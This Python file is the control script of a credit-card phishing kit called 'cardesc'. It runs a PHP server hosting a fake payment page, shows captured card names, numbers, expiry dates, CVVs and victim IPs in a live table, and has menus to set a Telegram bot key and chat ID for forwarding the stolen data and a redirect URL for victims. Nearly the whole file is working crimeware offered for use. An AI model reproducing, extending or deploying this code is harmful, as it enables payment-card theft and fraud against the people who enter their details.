import os
import time
import json
import requests
import webbrowser
import subprocess
from multiprocessing import Process
from prettytable import PrettyTable

# Constants
SETTINGS_PATH = "dist/details/settings.json"
LOG_FILE_PATH = "dist/details/log.log"
RESULT_LOG_PATH = "result.log"
LOCATION_FILE_PATH = "dist/details/location.location"
METADATA_PATH = "settings/config.json"

class PHPServer:
    # Handles the PHP built-in server execution.
    def __call__(self, port):
        try:
            # Using subprocess instead of os.system for better control
            cmd = ["php", "-S", f"localhost:{port}"]
            print(f"[>] Starting PHP server on port {port}...")
            subprocess.run(cmd, cwd="dist", check=True)
        except subprocess.CalledProcessError as e:
            print(f"[!] PHP server exited with error: {e}")
        except Exception as e:
            print(f"[!] Error starting PHP server: {e}")

class LogMonitor:
    # Monitors and displays incoming logs in a table format.
    def __call__(self, port):
        while True:
            try:
                self._clear_screen()
                print(f"[PHP] Local Server \"http://localhost:{port}\" is running!\n  |")
                
                table = PrettyTable()
                table.field_names = ["Type", "Name", "Number", "Date", "CVV", "IP", "Bot Sent"]
                
                if os.path.exists(LOG_FILE_PATH):
                    with open(LOG_FILE_PATH, "r", encoding="utf-8") as log_file:
                        for line in log_file:
                            line = line.strip()
                            if not line:
                                continue
                            try:
                                # Safe JSON parsing instead of exec()
                                data = json.loads(line)
                                table.add_row([
                                    data.get("type", "N/A"),
                                    data.get("name", "N/A"),
                                    data.get("number", "N/A"),
                                    data.get("date", "N/A"),
                                    data.get("cvv", "N/A"),
                                    data.get("ip", "N/A"),
                                    "True" if data.get("sent") else "False"
                                ])
                            except json.JSONDecodeError:
                                # Fallback for old log format if necessary
                                pass
                
                print(table)
                time.sleep(2)
            except KeyboardInterrupt:
                print("\n[!] Stopping server monitor...")
                break
            except Exception as e:
                print(f"[!] Error in server monitor: {e}")
                break

    def _clear_screen(self):
        # Portable way to clear terminal
        subprocess.run("cls" if os.name == "nt" else "clear", shell=True)

def update_check(meta):
    # Checks for script updates on GitHub.
    try:
        print("[>] Checking for updates...")
        response = requests.get(meta.get("url", ""), timeout=5)
        if response.status_code == 200:
            json_data = response.json()
            gh_version = str(json_data.get("version", "0"))
            if gh_version > str(meta.get("version", "0")):
                print(f"[+] New Update Available: {gh_version}")
                print(f"[+] Details: {meta.get('github', 'https://github.com/oldnum/cardesc')}")
                return True
        return False
    except Exception as e:
        print(f"[!] Update check failed: {e}")
        return False

def perform_update():
    # Performs an automatic update using git.
    try:
        print("[>] Starting Auto Update...")
        subprocess.run(["git", "checkout", "."], check=True)
        subprocess.run(["git", "pull"], check=True)
        print("[+] Successfully updated cardesc!")
        time.sleep(2)
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Update failed during git command: {e}")
        return False
    except Exception as e:
        print(f"[!] Update failed: {e}")
        return False

def get_logo(meta):
    # Returns the stylized ASCII logo.
    return f"""
┌─┐┌─┐┬─┐┌┬┐┌─┐┌─┐┌─┐
│  ├─┤├┬┘ ││├┤ └─┐│  
└─┘┴ ┴┴└──┴┘└─┘└─┘└─┘
[>] Version: {meta.get("version")} 
 ├ Type: {meta.get("type")} 
[>] Donate: {len(meta.get("donate", {}))} options
 ├ BTC:  {meta.get("donate", {}).get("btc")}          
 ├ ETH:  {meta.get("donate", {}).get("eth")}
 ├ USDT: {meta.get("donate", {}).get("usdt")} 
[>] Support: {meta.get("telegram")}
 └ Forewarned is forearmed :>
"""

def show_history(meta):
    # Displays the content of the result log file.
    subprocess.run("cls" if os.name == "nt" else "clear", shell=True)
    print(get_logo(meta))
    if os.path.exists(RESULT_LOG_PATH):
        with open(RESULT_LOG_PATH, "r", encoding="utf-8") as f:
            log_text = f.read()
        
        if not log_text:
            print("[>] Result log is empty.")
        else:
            print(log_text)
    else:
        print("[>] Result log not found.")
    input("\n[Press Enter to return]")

def start_payment_system(meta):
    # Starts the PHP server and the log monitor processes.
    try:
        port_input = input("[>] Enter port number (default 8080): ").strip()
        port = int(port_input) if port_input else 8080
        
        server = PHPServer()
        monitor = LogMonitor()
        
        p1 = Process(target=server, args=(port,))
        p2 = Process(target=monitor, args=(port,))
        
        p1.start()
        p2.start()
        
        p1.join()
        p2.join()
    except ValueError:
        print("[!] Invalid port number. Please enter a valid integer.")
        start_payment_system(meta)
    except Exception as e:
        print(f"[!] Error starting payment system: {e}")

def manage_settings(meta):
    # UI for managing Telegram bot and redirect settings.
    while True:
        subprocess.run("cls" if os.name == "nt" else "clear", shell=True)
        print(get_logo(meta))
        
        try:
            with open(SETTINGS_PATH, "r", encoding="utf-8") as file:
                settings = json.load(file)
            
            print("[1] Change Telegram Bot API Key")
            print("[2] Change Telegram User ID")
            print("[3] Change Redirect URL")
            print("[0] Back to Main Menu")
            
            choice = input("\n[>] Select option: ").strip()

            if choice == "1":
                settings["bot_api"] = input("[>] New API Key: ").strip()
            elif choice == "2":
                settings["chat_id"] = input("[>] New Chat ID: ").strip()
            elif choice == "3":
                new_url = input("[>] New Redirect URL: ").strip()
                if new_url:
                    with open(LOCATION_FILE_PATH, "w", encoding="utf-8") as f:
                        f.write(new_url)
            elif choice in ["0", ""]:
                break
            else:
                continue

            if choice in ["1", "2"]:
                with open(SETTINGS_PATH, "w", encoding="utf-8") as f:
                    json.dump(settings, f, indent=2, ensure_ascii=False)
                print("[+] Settings saved!")
                time.sleep(1)
                
        except Exception as e:
            print(f"[!] Error updating settings: {e}")
            time.sleep(2)

def show_support(meta):
    # Opens the support Telegram link.
    subprocess.run("cls" if os.name == "nt" else "clear", shell=True)
    print(get_logo(meta))
    tg_url = f"https://{meta.get('telegram')}"
    print(f"[>] Join Telegram for support: {tg_url}")
    try:
        webbrowser.open(tg_url, new=2)
    except:
        pass
    input("[Press Enter to return]")

def check_dependencies():
    # Verifies if PHP is installed and available.
    try:
        subprocess.run(["php", "--version"], capture_output=True, check=True)
        return True
    except (FileNotFoundError, subprocess.CalledProcessError):
        print("[!] PHP not found. Please install PHP to continue.")
        return False

def main():
    # Load metadata
    try:
        if not os.path.exists(METADATA_PATH):
             # Try to find it in the current dir if not in info/
             if os.path.exists("metadata.json"):
                 with open("metadata.json", "r", encoding="utf-8") as f: meta = json.load(f)
             else:
                 print("[!] Metadata file not found.")
                 return
        else:
            with open(METADATA_PATH, "r", encoding="utf-8") as f: meta = json.load(f)
    except Exception as e:
        print(f"[!] Error loading metadata: {e}")
        return

    # Initialize files
    try:
        with open(LOG_FILE_PATH, "w", encoding="utf-8") as f:
            pass # Clear session log
        if not os.path.exists(LOCATION_FILE_PATH) or os.stat(LOCATION_FILE_PATH).st_size == 0:
            with open(LOCATION_FILE_PATH, "w", encoding="utf-8") as f:
                f.write("https://google.com")
    except Exception as e:
        print(f"[!] Setup error: {e}")

    # Script Check
    if update_check(meta):
        if perform_update():
            return

    if not check_dependencies():
        return

    # Main Menu Loop
    while True:
        try:
            subprocess.run("cls" if os.name == "nt" else "clear", shell=True)
            print(get_logo(meta))
            print("[1] Transaction History")
            print("[2] Payment Page")
            print("[3] Settings")
            print("[4] Support")
            print("[0] Exit")
            
            choice = input("\n[>] Choice: ").strip().upper()
            
            if choice == "1":
                show_history(meta)
            elif choice == "2":
                start_payment_system(meta)
            elif choice == "3":
                manage_settings(meta)
            elif choice == "4":
                show_support(meta)
            elif choice in ["0", "E", "Q"]:
                break
        except KeyboardInterrupt:
            print("\nExit. Forewarned is forearmed.")
            break
        except Exception as e:
            print(f"[!] Loop error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    main()